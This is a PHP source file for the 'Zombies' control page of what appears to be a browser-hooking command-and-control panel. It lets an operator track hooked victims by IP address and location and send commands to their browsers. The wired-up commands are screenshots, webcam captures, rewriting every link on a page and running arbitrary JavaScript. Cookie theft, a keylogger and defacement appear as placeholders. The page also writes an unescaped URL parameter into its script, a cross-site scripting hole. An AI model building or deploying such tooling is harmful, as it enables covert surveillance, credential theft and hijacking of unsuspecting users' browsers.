<?php
/*
Page: Zombies
*/
require_once('./includes/functions.php');
require_once('./includes/javascript_generator.php');
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title><?php echo "$sitename"; ?></title>

    <!-- Bootstrap core CSS -->
    <link href="./styles/bootstrap-3.3.7/css/bootstrap-slate.min.css" rel="stylesheet">
    <link href="./styles/stylesheet.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="./styles/bootstrap-3.3.7/css/dashboard.css" rel="stylesheet">
  </head>

<?php
if(user_logged_in()) {
	if(isset($_GET['zid'])) {
		$zid = $_GET['zid'];
		$uid = get_unique_id(get_userid());
		$zombie = get_zombie_info($zid);
		//Secondary side bar links array
		//First value is name of options
		//Second link is onclick function for options
		//If first value == divider then second value will be header name for divider
		//If second value is an array it will create dropdown option in side menu
		//First value of dropdown array is name of option
		//Second value of dropdown array is onlick function for option
		//If first value of dropdown array == dropdown_header then second value of dropdown array is dropdown header
		$sidebarlinks = array(
			"divider" => "Control Zombie",
			"<span class='glyphicon glyphicon-eye-open' aria-hidden='true'></span> Recon" => array(
					"dropdown_header" => "Gather Client Data",
					"<span class='glyphicon glyphicon-picture' aria-hidden='true'></span> Take Screenshot" => "create_screenshot_command('$uid', '$zid');",
					"<span class='glyphicon glyphicon-camera' aria-hidden='true'></span> Take Webcam Picture" => "create_webcam_command('$uid', '$zid');",
					"<span class='glyphicon glyphicon-question-sign' aria-hidden='true'></span> Prompt Zombie" => "generate_modal('Prompt Zombie', 'This will prompt Zombie using Javascripts built in prompt function.<br>Zombie response will be in logs.<br><br>Text to prompt Zombie\:<input id=\'prompt_text\' class=\'form-control\'>', 'Prompt', 'prompt_zombie(\'$uid\', \'$zid\');');",
					"<span class='glyphicon glyphicon-list-alt' aria-hidden='true'></span> Steal Input Values" => "#",
					"<span class='glyphicon glyphicon-cog' aria-hidden='true'></span> Steal Cookies" => "#",
					"<span class='glyphicon glyphicon-cog' aria-hidden='true'></span> Get Browser Plugins" => "#",
					"<span class='glyphicon glyphicon-cog' aria-hidden='true'></span> Check If Java Is Enabled" => "#",
					"<span class='glyphicon glyphicon-font' aria-hidden='true'></span> Key Logger" => "#"
			),
			"<span class='glyphicon glyphicon-edit' aria-hidden='true'></span> Page Manipulation" => array(
					"dropdown_header" => "Manipulate Webpage",
					"<span class='glyphicon glyphicon-link' aria-hidden='true'></span> Change All Link Locations" => "generate_modal('Replace All Links', 'This will change all the HREF values of all a tags with supplied URL.<br><br>URL to change link locations with\:<input id=\'link_location\' class=\'form-control\'>', 'Change', 'replace_all_links(\'$uid\', \'$zid\');');",
					"<span class='glyphicon glyphicon-link' aria-hidden='true'></span> Change All Form Action Links" => "generate_modal('Replace All Form Actions', 'This will change all the HREF values of all a tags with supplied URL.<br><br>URL to change link locations with\:<input id=\'link_location\' class=\'form-control\'>', 'Change', 'replace_all_links(\'$uid\', \'$zid\');');",
					"<span class='glyphicon glyphicon-refresh' aria-hidden='true'></span> Flip Page Upside Down" => "#",
					"<span class='glyphicon glyphicon-pencil' aria-hidden='true'></span> Deface Page" => "#",
					"<span class='glyphicon glyphicon-play' aria-hidden='true'></span> Play Audio" => "#"
			),
			"<span class='glyphicon glyphicon-console' aria-hidden='true'></span>  Execute" => array(
					"dropdown_header" => "Execute On Zombie",
					"<span class='glyphicon glyphicon-console' aria-hidden='true'></span>  Exec Custom Javascript" => "generate_modal('Execute Custom Javascript', 'Javascript to execute\:<br><br>No script tags!<br><textarea id=\'custom_js\' class=\'form-control\' rows=\'8\'></textarea>', 'Execute', 'execute_custom_js(\'$uid\', \'$zid\');');",
					"<span class='glyphicon glyphicon-save' aria-hidden='true'></span> Push Download" => "#",
					"<span class='glyphicon glyphicon glyphicon-send' aria-hidden='true'></span> Send GET/POST Request" => "#"
			)
		);

		//Display main boostrap HTML
		//First value is name of page
		//Second value is array of secondary side bar links
		display_bootstrap("Zombies", $sidebarlinks);

		//Main body of page
		echo '<div class="col-sm-9 col-sm-offset-3 col-md-10 col-md-offset-2 main">';

		if($zombie && check_if_online($uid, $zid)) {
			echo "<div id='online_status'>";
			echo "<h1 class='page-header' title='Online'><font color=green>".$zombie['ipaddress']."</font><img src='./styles/images/online.png' title='Online'></h1>";
			echo "User Agent: ".$zombie['user_agent']."<br>";
			echo "Uptime: ".get_uptime($zombie['timestamp'])."<br><br>";
			echo "</div>";
			echo location_information($zombie['ipaddress']);
			echo "<br>";
			get_zombie_logs($uid, $zid);
		} else {
			echo "<div id='online_status'>";
			echo "<h1 class='page-header' title='Offline'><font color=red>".$zombie['ipaddress']."</font><img src='./styles/images/offline.png' title='Offline'></h1>";
			echo "User Agent: ".$zombie['user_agent']."<br><br>";
			echo "</div>";
			echo location_information($zombie['ipaddress']);
			echo "<br>";
			get_zombie_logs($uid, $zid);
		}
	}
	
} else {
	echo "Logged out";
}
echo '</div>
</div>';
?>
<script>
function refresh_status() {
	$('#zombie_logs').load('control_zombie.php?zid=<?php if(isset($_GET['zid'])) { echo $_GET['zid']; }?> #zombie_logs');
	$('#online_status').load('control_zombie.php?zid=<?php if(isset($_GET['zid'])) { echo $_GET['zid']; }?> #online_status');
}
setInterval(refresh_status, <?php echo "$zombiecontrolrefresh"; ?>);
</script>
  <!-- Modal -->
  <div class="modal fade" id="modal" role="dialog">
    <div class="modal-dialog">
    
      <!-- Modal content-->
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal">&times;</button>
          <h4 class="modal-title">Modal Header</h4>
        </div>
        <div class="modal-body">
          <p>Some text in the modal.</p>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-default" data-dismiss="modal" onclick="" id="modalButton">Close</button>
        </div>
      </div>
      
    </div>
  </div>